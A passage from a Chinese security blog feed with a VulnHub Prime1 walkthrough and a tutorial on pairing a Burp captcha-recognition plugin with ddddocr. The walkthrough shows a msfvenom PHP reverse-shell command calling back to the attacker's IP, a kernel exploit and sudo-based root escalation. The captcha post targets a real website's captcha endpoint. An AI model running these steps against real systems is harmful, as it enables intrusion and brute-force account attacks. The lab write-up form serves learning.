alt="image-20221103172359891"></p><p>翻译</p><blockquote><p>小伙子不错啊！</p><p>现在你知道正确的参数了</p><p><strong>用<code>secrettier360</code>参数去尝试其他的php页面吧！</strong></p></blockquote><h2 id="得到iamge-php的参数"><a href="#得到iamge-php的参数" class="headerlink" title="得到iamge.php的参数"></a>得到iamge.php的参数</h2><p>这时，把上面没变化的<code>image.php</code>按照提示的参数试一试</p><p><img src="/img/image-20221103184200350.png" alt="image-20221103184200350"></p><p>好的，你得到了正确的参数</p><h2 id="password-txt"><a href="#password-txt" class="headerlink" title="password.txt"></a>password.txt</h2><p>然后呢，就一句话就没了？？？思路好像又断了，继续往下想想，既然给了file让我们来读取文件，那我们可不可以去读取一些敏感文件呢？说干就干！</p><p>然而，emmmmmm…….又断了，系统提示挖错文件了</p><p><img src="/img/image-20221103184903209.png" alt="image-20221103184903209"></p><p>试试另外一个，居然成了，好吧我装的，因为我去看了视频。</p><p>我一直在试前面那个<code>index.php</code>的参数，反而忽视了靶场一步步把我们引到到<code>image.php</code>，还给了正确的参数。</p><p><img src="/img/image-20221103185510097.png" alt="image-20221103185510097"></p><p>接下来就顺着给出的提示，我尝试直接读取password.txt，没有结果</p><p>看了一眼上面的提示，Find <strong>password.txt</strong> in <strong>my directory</strong></p><p>分析主要的突破点是要知道提示所说的<strong>my directory</strong>是指的哪一个目录，想到Linux下，每一个用户都有一个home目录，用户名是victor，接下来我们就来验证这条猜想</p><p><img src="/img/image-20221103190414091.png" alt="image-20221103190414091"></p><p>还是那句话，空空如也，我C他NN的！！！</p><p>这时候，我又去看了一眼上面的截图，就在我画框的后面，就有路径啊！！！我顺着那个路径找过去，出来了！还是我太菜了，Linux基础学的不好，才去分析上面那一堆有的没的。</p><p><img src="/img/image-20221103190658299.png" alt="image-20221103190658299"></p><h2 id="登录WordPress"><a href="#登录WordPress" class="headerlink" title="登录WordPress"></a>登录WordPress</h2><p>当时看到这串字符的时候，我第一反应是有点懵，要我关注ippsec？？？这是啥意思，过了一会才反应过来，这有没有可能就是密码啊？而且这是password.txt欸？</p><p>拿着这串字符去试着登录了一下victor用户，喜提”密码错误“💔💔💔</p><p><img src="/img/image-20221103190941126.png" alt="image-20221103190941126"></p><p>到这，我又不知道怎么办了。</p><p>去看了下视频的提示：<strong>这到底是什么的密码？</strong></p><p>于是我想起，之前端口扫描的时候，有个22端口，猜测有可能是<strong>SSH</strong>的密码，我马上打开我的XShell。</p><p>哈哈，没连上mad❗</p><p>然后我又想，还有啥密码？前面好像还有个WordPress博客，去试试看，也许就是这个呢？然后我往上翻了下之前目录扫描的截图，进到了<a href="http://192.168.120.145/wordpress/wp-admin%EF%BC%8C%E7%84%B6%E5%90%8E%E8%B7%B3%E8%BD%AC%E5%88%B0wordpress%E7%9A%84%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2">http://192.168.120.145/wordpress/wp-admin，然后跳转到wordpress的登陆界面</a></p><p><img src="/img/image-20221103225332819.png" alt="image-20221103225332819"></p><p>用户名当然是猜的victor，因为之前看过这个博客首页，加上靶机上的登录用户名也是victor，密码输入follow_the_ippsec，点登录</p><blockquote><p>后面了解到，WordPress在搭建成功后会自动生成一篇博客，用户名就是管理员的用户名</p><p>还有Kali自带的工具<code>cmseek</code>和<code>wpscan</code>可以去扫描WordPress站点的用户名和漏洞，以及其他信息</p></blockquote><p>在几秒的转圈圈之后，进去了！！！</p><p><img src="/img/image-20221103225535739.png" alt="image-20221103225535739"></p><p>找了一圈，没发现什么信息。唯一发现了一个邮箱，我还用这个邮箱去试了一下密码，不对，作罢！</p><p>又开始偷思路😂😂😂</p><h2 id="WordPress主题编辑"><a href="#WordPress主题编辑" class="headerlink" title="WordPress主题编辑"></a>WordPress主题编辑</h2><p>了解到【Appearance】的【Theme Editer】可以编辑主题，里面存在部分php可以被编辑，php哦！！！还是可以编辑的，那不直接一句话木马开搞？？？</p><p><img src="/img/image-20221103231333565.png" alt="image-20221103231333565"></p><p>接下来就是去找可以编辑的，连着点了好多个，都是这种不能修改的</p><p><img src="/img/image-20221103231930552.png" alt="image-20221103231930552"></p><p>皇天不负有心人！终于找到一个能改的</p><p><img src="/img/image-20221103232115455.png" alt="image-20221103232115455"></p><h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>直接开整！！！等啥呀？</p><p><img src="/img/image-20221103232359755.png" alt="image-20221103232359755"></p><p>上传成功！nice！好了，就等着我拿下你吧小卡拉米！</p><p>高高兴兴掏出我的蚁剑</p><p><img src="/img/image-20221104100447856.png" alt="image-20221104100447856"></p><p>好了，问题来了，我这个URL要怎么填？WordPress的后台编辑那里的url是<a href="http://192.168.120.145/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen%EF%BC%8C%E8%BF%99%E4%B8%80%E7%9C%8B%E5%B0%B1%E4%B8%8D%E8%A1%8C%E5%95%8A%EF%BC%8C%E6%88%91%E8%A6%81%E6%89%BE%E5%88%B0secret.php%E7%9A%84%E7%9C%9F%E5%AE%9E%E8%B7%AF%E5%BE%84%E6%89%8D%E8%A1%8C%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E5%AF%B9WordPress%E4%B8%8D%E7%86%9F%E6%82%89%EF%BC%8C%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E7%8C%9C%E8%BF%99%E4%B8%AA%E8%B7%AF%E5%BE%84%E3%80%82">http://192.168.120.145/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen，这一看就不行啊，我要找到secret.php的真实路径才行，但是我对WordPress不熟悉，不知道怎么猜这个路径。</a></p><h2 id="确定路径"><a href="#确定路径" class="headerlink" title="确定路径"></a>确定路径</h2><p>我知道WordPress是开源的，于是我上<a href="https://core.trac.wordpress.org/browser/#branches/5.2/src/wp-admin/includes">WordPress官网</a>下了一份5.2版本的源码（<strong>Dashboard</strong>往下划，<strong>At a Glance</strong>板块可以看到WordPress的版本和使用的主题）</p><p><img src="/img/image-20221104110916788.png" alt="image-20221104110916788"></p><p>然后就顺着这个线索，结合上面修改页面右侧的文件结构，在源码里找到了这个路径</p><p><img src="/img/image-20221104111036384.png" alt="image-20221104111036384"></p><p><img src="/img/image-20221104111310256.png" alt="image-20221104111310256"></p><p>接下来我就按照这个路径，用蚁剑去连了。</p><p>直接红一片我也是没想到</p><p><img src="/img/image-20221104111549931.png" alt="image-20221104111549931"></p><p>然后我又去浏览器访问这个网址</p><p><img src="/img/image-20221104111657882.png" alt="image-20221104111657882"></p><p>返回404，意思就是secret.php不在这个路径</p><p>到这里，思路又断了（真的太菜了）</p><p>继续偷思路（emm这叫借鉴！！）</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>了解到可以<strong>反弹shell</strong>，其实之前一直知道这个概念，但是没有实战过，所以也不知道什么时候该用，怎么用。这次真的是学到了！</p><p>继续用我浅显的理解来解释一下<strong>反弹shell</strong></p><blockquote><p>首先要明确：<strong>反弹shell</strong>和<strong>一句话木马</strong>的目的都是一样的，就是<strong>为了拿shell</strong></p><p>区别在于</p><ul><li>一句话木马：上传之后，你得主动用WebShell管理工具之类的东西去连他，连上了才可以</li><li>反弹shell：让<strong>它主动来连你</strong></li></ul><p>这有啥不一样呢？为啥一定要它来连你呢？你连他为啥又不行呢？</p><p>想象一下，你去别的学校找朋友玩泥巴，但是他们学校只允许本校师生进出，不允许外面的人进出。这时候，你们想见面一起玩泥巴，那就只能让他出来找你，因为门卫不让你进去找他啊！！（说翻墙钻狗洞进去的小伙子，你真是个大聪明🤡）</p><p>一样的意思，当一台机子处于<strong>内网、动态IP</strong>，或者<strong>配置了防火墙、杀毒软件</strong>，那很可能，你是没有办法去连接它的，只能让它出来连你，这就是<strong>反弹shell</strong></p></blockquote><h3 id="生成php反弹shell代码"><a href="#生成php反弹shell代码" class="headerlink" title="生成php反弹shell代码"></a>生成php反弹shell代码</h3><p>现在，用我们的<em><strong>美少妇（MSF）</strong></em>来生成php反弹shell的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.120.128 lport=6666 -o shell.php</span><br></pre></td></tr></table></figure><blockquote><p>这句话的意思是让msfvenom的php&#x2F;meterpreter&#x2F;reverse_tcp模块来生成反弹shell的脚本，设置让靶机来连Kali（IP:192.168.120.128）的6666端口，保存为<code>shell.php</code></p></blockquote><p><img src="/img/image-20221104133526200.png" alt="image-20221104133526200"></p><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><p>把生成的代码粘贴到<code>secret.php</code>里面（粘贴我上面黑色的那一坨，前面俩不要粘上去了），保存</p><p><img src="/img/image-20221104134106090.png" alt="image-20221104134106090"></p><h3 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h3><p>接下来，就是监听了</p><blockquote><p>为啥要监听？</p><p>接着上面的例子说哈，你朋友都出校门来找你玩泥巴来了，你不得蹲在门口等他吗？不然你怎么知道他出来了呢？只能蹲在门口守着呗。</p><p>这也是一样的，你让靶机来连你，你不监听那个端口，你咋知道它来连你那个端口了？</p></blockquote><p>那我们用啥来监听呢？<del>当然是亲自蹲在电脑显示器上呗</del>（bushi）</p><p>当然是用工具来监听啦~可用的工具有很多，这里推荐<code>nc</code>和<code>msfconsole</code></p><p>这里用msfconsole（因为它给我比心❤）</p><ol><li>命令行输入<code>msfconsole</code>，启动美少妇</li></ol><p><img src="/img/image-20221104134918991.png" alt="image-20221104134918991"></p><ol start="2"><li>使用监听模块</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221104135312786.png" alt="image-20221104135312786"></p><ol start="3"><li>告诉它，你在等待一个php的反弹来连你</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里的模块和上面使用msfvenom生成反弹shell的模块是一样的</span></span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><ol start="4"><li>指定监听的IP和端口</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.120.128</span><br><span class="line">set lport 6666</span><br></pre></td></tr></table></figure><ol start="5"><li>启动监听</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">任选一个执行，效果是一样的</span></span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h3 id="拿到shell"><a href="#拿到shell" class="headerlink" title="拿到shell"></a>拿到shell</h3><p>监听就准备好啦~接下来的问题是</p><p><strong>靶机什么时候来连我们呢？</strong></p><p>这就得你去提醒一下它，让他来连你，这时候我突然发现，我上面费大劲找的<code>secret.php</code>路径，这时候用得到了！！！</p><p>访问<a href="http://192.168.120.145/wordpress/wp-content/themes/twentynineteen/secret.php">http://192.168.120.145/wordpress/wp-content/themes/twentynineteen/secret.php</a></p><p><img src="/img/image-20221104140546616.png" alt="image-20221104140546616"></p><p>页面虽然一直在加载，这时候打开我们的Kali看看，已经进入到meterpreter了！！！就是已经反弹连接上了，我们已经拿到靶机的shell了。</p><p>执行命令看看，没问题！</p><p><img src="/img/image-20221104155213895.png" alt="image-20221104155213895"></p><blockquote><p>注意：</p><p>我们此时拿到的shell环境，并不是root用户，meterpreter并不能执行所有的命令</p></blockquote><h1 id="内核提权【适用于Ubuntu-4-10】"><a href="#内核提权【适用于Ubuntu-4-10】" class="headerlink" title="内核提权【适用于Ubuntu 4.10】"></a>内核提权【适用于Ubuntu 4.10】</h1><p>上面我们拿到了靶机的Linux版本，用msfconsole看看有没有能提权的模块</p><blockquote><p>&#x3D;&#x3D;注意&#x3D;&#x3D;：<em>不要在meterpreter下直接执行，新开一个Terminal，进入msfconsole里面执行</em></p><p>或者使用<code>background</code>回退到msf的界面，记住返回的<code>session</code>为1，到时候直接通过<code>sessions 1</code>回到meterpreter</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 16.04 Ubuntu</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221104171340983.png" alt="image-20221104171340983"></p><p>使用其中符合条件的<em><strong>linux&#x2F;local&#x2F;45010.c</strong></em></p><blockquote><p>用来提权到root，用C语言编写其路径为&#x2F;usr&#x2F;share&#x2F;exploits&#x2F;local&#x2F;45010.c</p></blockquote><ol><li>将该文件拷贝到当前目录</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/45010.c ./</span><br></pre></td></tr></table></figure><ol start="2"><li>用<code>gcc</code>编译该文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o 45010</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>用meterpreter</strong>把上面生成的<code>45010</code>移动到靶机里面（<strong>此步骤在meterpreter里面执行！！！</strong>）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/slipper/45010 /tmp</span><br></pre></td></tr></table></figure><blockquote><p>本句的意思是：把本机<code>home/slipper/45010</code>上传到靶机的<code>/tmp</code>目录</p></blockquote><ol start="4"><li>进入shell，给<code>45010</code>添加可执行的权限</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3108 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时已经进入到靶机的shell环境</span></span><br><span class="line">pwd# 查看当前目录</span><br><span class="line">/tmp</span><br><span class="line">chmod +x 45010# 添加执行权限</span><br><span class="line">./45010# 执行该提权程序</span><br></pre></td></tr></table></figure><p>这时候已经提权成功了</p><h1 id="提权失败"><a href="#提权失败" class="headerlink" title="提权失败"></a>提权失败</h1><p>&#x3D;&#x3D;实际上，我的提权失败了&#x3D;&#x3D;</p><p>按理来说，是可以成功的，但是我当时没弄完就去做其他的事情，第二天再来弄的时候，我的靶机IP变了，从145变成147了。我当时觉得奇怪，因为我虚拟机Kali的IP一直就没变过，为什么这个突然变了。当时没有在意，直到我使用上述方法，屡次提权失败</p><p>于是，我几乎翻遍了网上关于Prime1这个靶机的记录，终于看到一句话：</p><p>&#x3D;&#x3D;有些情况我们下载的靶机的版本并不是Ubuntu4.10而是Ubuntu 4.15，就不能通过45010这个复现成功&#x3D;&#x3D;</p><p>但是我明明记得我是4.10。然后，我就又去看了一下我Ubuntu靶机的版本信息</p><p><img src="/img/image-20221105150754154.png" alt="image-20221105150754154"></p><p>&#x3D;&#x3D;我的Ubuntu居然自动升级了！&#x3D;&#x3D;</p><p>可以往上看我当时的截图，当时的版本是4.10的，一觉起来，Ubuntu靶机给我自动升级成4.15了，估计也是这个原因，导致靶机的IP发生了变化。</p><p>而此时，4.15版本的已经不能使用上述方法提权了。我用msf搜索了升级之后的版本还有没有可以用的提权代码，已经🈚了，所以靠nday提权已经行不通了，靶机的设计者的目的并不是想让我们靠提权来拿到Flag，而是像上面一样，一层层的剥开，找到密码。</p><blockquote><p>这个问题真的折磨了我很久，第一次遇到这种骚操作</p></blockquote><h1 id="提权【适用于Ubuntu-4-15】"><a href="#提权【适用于Ubuntu-4-15】" class="headerlink" title="提权【适用于Ubuntu 4.15】"></a><strong>提权【适用于Ubuntu 4.15】</strong></h1><ol><li>进入shell环境</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; shell</span><br></pre></td></tr></table></figure><ol start="2"><li><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method1pythonptymodule">将shell升级到完全交互式的TTY</a></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><ol start="3"><li>查看当前用户可以用 sudo 执行哪些命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105153916471.png" alt="image-20221105153916471"></p><p>这里的<code>/home/saket/enc</code>引起了注意，它是一个可执行文件，执行需要输入密码，使用<code>follow_the_ippsec</code>发现不对</p><h2 id="backup文件"><a href="#backup文件" class="headerlink" title="backup文件"></a>backup文件</h2><p>在<code>/opt</code>目录下发现<code>backup</code>文件夹，最终发现了<code>可执行文件enc</code>的密码为<code>backup_password</code></p><p><img src="/img/image-20221105154613484.png" alt="image-20221105154613484"></p><ol start="4"><li>执行<code>enc</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/saket</span><br><span class="line">./enc</span><br></pre></td></tr></table></figure><ol start="5"><li>此时发现<code>/home/saket</code>目录下多了两个文件：<code>enc.txt</code>和<code>key.txt</code></li></ol><p><img src="/img/image-20221105155104206.png" alt="image-20221105155104206"></p><p>得到了一串字符和一条提示，看样子应该是base64编码的</p><ol start="6"><li>使用<a href="https://www.cmd5.com/">cmd5</a>加密<code>ippsec</code></li></ol><p><img src="/img/image-20221105155927773.png" alt="image-20221105155927773"></p><p>得到</p><p>md5(ippsec,32) &#x3D; 366a74cb3c959de17d61db30591c39d1<br>md5(ippsec,16) &#x3D; 3c959de17d61db30</p><ol start="7"><li>使用<a href="https://www.devglan.com/online-tools/aes-encryption-decryption">AES Encryption and Decryption Online Tool</a>解密<code>enc.txt</code></li></ol><p><img src="/img/image-20221105161448956.png" alt="image-20221105161448956"></p><p>解密结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RG9udCB3b3JyeSBzYWtldCBvbmUgZGF5IHdlIHdpbGwgcmVhY2ggdG8Kb3VyIGRlc3RpbmF0aW9uIHZlcnkgc29vbi4gQW5kIGlmIHlvdSBmb3JnZXQgCnlvdXIgdXNlcm5hbWUgdGhlbiB1c2UgeW91ciBvbGQgcGFzc3dvcmQKPT0+ICJ0cmlidXRlX3RvX2lwcHNlYyIKClZpY3Rvciw=</span><br></pre></td></tr></table></figure><ol start="8"><li>对上面的字符串进行<a href="https://tool.chinaz.com/tools/base64.aspx">Base64解码</a></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Dont worry saket one day we will reach to</span><br><span class="line">our destination very soon. And if you forget </span><br><span class="line">your username then use your old password</span><br><span class="line">==&gt; &quot;tribute_to_ippsec&quot;</span><br><span class="line"></span><br><span class="line">Victor,</span><br></pre></td></tr></table></figure><p>得到了密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tribute_to_ippsec</span><br></pre></td></tr></table></figure><h2 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su saket</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105162115763.png" alt="image-20221105162115763"></p><ul><li>查看saket用户可用sudo执行的命令</li></ul><p><img src="/img/image-20221105165526516.png" alt="image-20221105165526516"></p><ul><li>跟进到&#x2F;home&#x2F;victor&#x2F;undefeated_victor</li></ul><p><img src="/img/image-20221105165644625.png" alt="image-20221105165644625"></p><p>提示<code>/tmp/challenge</code> not found</p><h2 id="x2F-bin-x2F-bash提权"><a href="#x2F-bin-x2F-bash提权" class="headerlink" title="&#x2F;bin&#x2F;bash提权"></a>&#x2F;bin&#x2F;bash提权</h2><ul><li>接下来的思路就是创建<code>challenge</code>文件，将<code>/bin/bash</code>写入文件中，然后重新执行<code>sudo /home/victor/undefeated_victor</code>命令以<strong>获取root权限的shell</strong>.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; challenge</span><br><span class="line">chmod +x challenge</span><br><span class="line">sudo /home/victor/undefeated_victor</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105170834360.png" alt="image-20221105170834360"></p><p>可以看到，此时已经&#x3D;&#x3D;成功拿到root权限&#x3D;&#x3D;</p><h1 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h1><ul><li>切换到&#x2F;root,查看</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105171431456.png" alt="image-20221105171431456"></p><ul><li>查看<code>root.txt</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat root.txt</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105171456711.png" alt="image-20221105171456711"></p><p>完结撒花~~~终于拿到了flag</p><h1 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h1><h2 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h2><ul><li><p>使用nmap扫描的时候，用的是最简单的命令，扫描显示出来的信息比较单一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sTVC ... &gt; xxx.txt</span><br></pre></td></tr></table></figure><p>导出到文件里，到时候找起来更方便，不要每次都在终端翻来翻去</p></li><li><p>对Kali内的工具不熟悉，到某个特定的步骤之后，知道要干啥，但不知道具体要怎么做，有什么工具可以使用。如果只下载了，又不去用它，那为什么要下载呢？单纯为了好看吗？</p><blockquote><p>后续花时间专门整理一下Kali的工具，输出一个文档</p></blockquote></li></ul><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>初次解除了完整的一套渗透测试流程，从查找IP到拿到Root权限，从Web打到shell再到提权</li><li>wordpress的主题模块可以执行命令</li><li>反弹shell初体验</li><li>更加熟悉linux的一些命令，比如<code>sudo -l</code>等</li><li>msf可用用background命令把meterpreter退到后台</li></ul><h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><ul><li>最后AES解密：为什么是AES？那些参数是这么选的，问了大佬，说是密码学的知识！补！！！</li><li>写入<code>/bin/bash</code>提权，不懂！看！！！</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp验证码爆破captcha-killer+ddddocr</title>
      <link href="/burpsuite-captcha-killer-ddddocr/"/>
      <url>/burpsuite-captcha-killer-ddddocr/</url>
      
        <content type="html"><![CDATA[<h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ul><li><a href="https://github.com/f0ng/captcha-killer-modified/releases/">Releases · f0ng&#x2F;captcha-killer-modified</a></li></ul><p>​最新版的Burp插件（根据自己的jdk版本来选择）</p><p><img src="/img/202211021704736.png" alt="image-20221102155830776"></p><ul><li><a href="https://github.com/f0ng/captcha-killer-modified/tree/0.16">f0ng&#x2F;captcha-killer-modified at 0.16</a></li></ul><p>​把<code>codereg.py</code>给down下来（你可以选择直接下zip包，或者直接复制）</p><p><img src="/img/202211021704971.png" alt="image-20221102160044024"></p><ul><li>安装ddddocr所需要的python库</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ddddocr aiohttp</span><br></pre></td></tr></table></figure><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Burp安装插件</p><p><img src="/img/202211021704397.png" alt="image-20221102160634476"></p><h1 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h1><h2 id="测试接口"><a href="#测试接口" class="headerlink" title="测试接口"></a>测试接口</h2><p>1、首先得找个验证码接口，不然咋测试？</p><p>​我这里随便上网找了个网站的<a href="http://passport.youmi.cn/include/showcaptcha/?w=62&h=24&s=12&x=0.7366157956335038&mobile=">验证码接口</a></p><p>​你可以自己找，也可以直接用我上面找的那个</p><p>2、访问上面的接口，bp抓包，发送到repeater模块（因为没有找到可以直接发到captcha-killer模块的选项）</p><p><img src="/img/202211021705301.png" alt="image-20221102164204151"></p><p>3、发送到captcha-killer</p><p>​选send to captcha panel哈！！</p><p>​下面的interface panel是识别模块用的（这里也就是ddddocr）</p><p><img src="/img/202211021705424.png" alt="image-20221102164341238"></p><p>4、点击【获取】，看后面的验证码也没有变化，有变化的话，测试接口这一部分就没问题啦</p><p><img src="/img/202211021705259.png" alt="image-20221102164611408"></p><p>接下来就开始配置ddddocr模块去识别</p><h2 id="ddddocr配置"><a href="#ddddocr配置" class="headerlink" title="ddddocr配置"></a>ddddocr配置</h2><p>刚刚下的<code>codereg.py</code>还记得么？pip包装好了就可以开始下面的步骤了。</p><p>1、用你的python3去运行它</p><p>​因为我电脑有两个版本的python，环境变量区分了python2和python3，你可以根据你自己电脑的配置来运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 codereg.py</span><br></pre></td></tr></table></figure><p>确定该服务已经起来了</p><p><img src="/img/202211021705519.png" alt="image-20221102165131315"></p><p>2、配置interface</p><p>​我换了4130端口，你那边填多少端口以你上面跑python脚本的时候输出的端口</p><p><img src="/img/202211021705686.png" alt="image-20221102165229831"></p><p>request的内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /reg HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:4130</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 55</span><br><span class="line"></span><br><span class="line">&lt;@BASE64&gt;&lt;@img_RAW&gt;&lt;@img_RAW&gt;&lt;@BASE64&gt;</span><br></pre></td></tr></table></figure><p>激动人心的时候到啦！</p><p>3、点【识别】</p><p><img src="/img/202211021705281.png" alt="image-20221102165526579"></p><p>欸~~这就可以啦</p><p>匹配方式选择Response data就好</p><p>如果返回 <strong>空白</strong>或者<strong>403Forbidden</strong>，参考以下方法</p><h1 id="返回空白"><a href="#返回空白" class="headerlink" title="返回空白"></a>返回空白</h1><p>接口的request填错了会这样，我遇到过，直接复制上面的模板就好</p><h1 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h1><p>打开<code>codereg.py</code></p><p>把下面这两句引起403报错的语句注释掉就好</p><p><img src="/img/202211021705894.png" alt="image-20221102165756410"></p><p>接着Ctrl+C停止之前的脚本，重新运行一遍脚本，就可以啦</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo简明教程</title>
      <link href="/hexo-tutorial/"/>
      <url>/hexo-tutorial/</url>
      
